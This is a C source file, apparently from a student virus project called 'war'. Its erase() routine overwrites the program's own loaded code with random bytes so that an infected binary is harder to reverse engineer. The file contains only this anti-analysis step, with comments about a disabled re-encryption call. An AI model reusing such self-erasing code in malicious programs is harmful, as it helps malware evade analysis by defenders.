/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   erase.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/04/12 13:20:56 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/12 15:07:17 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"


/*
  Erase() replace loaded binary data by random data.
  It the last idea we had to make the binary the most dificult to reverse.
  At least for a begginer reverser like us.
*/
void	erase(t_data *data)
{
	// revert(data, (char*)end, (size_t)release - (size_t)erase);

#ifdef DEBUG
	char de[] = "erase\t\t0\n";
	data->context == true ?	de[7] = 49 : 0;
	_log(de, _strlen(de));
#endif

	char	*start = (char*)war;
	int		size = (size_t)release - (size_t)war;
	char	buf[size];

	// random or zeroed
	if (_get_random(buf, size, GRND_NONBLOCK) < 0)
	{
		for (register int i = 0 ; i < size ; i++)
			buf[i] = 0;
	}

	for (register int i = 0 ; i < size ; i++)
		start[i] = buf[i];

	/* disabled due to mysterious segfault in infected binary that pop out of nowhere */
	/* update_two(&data->key, (char*)release, (size_t)end - (size_t)release); */
	/* revert_two(&data->key, (char*)end, (size_t)update_one - (size_t)end); */

	end(data);
}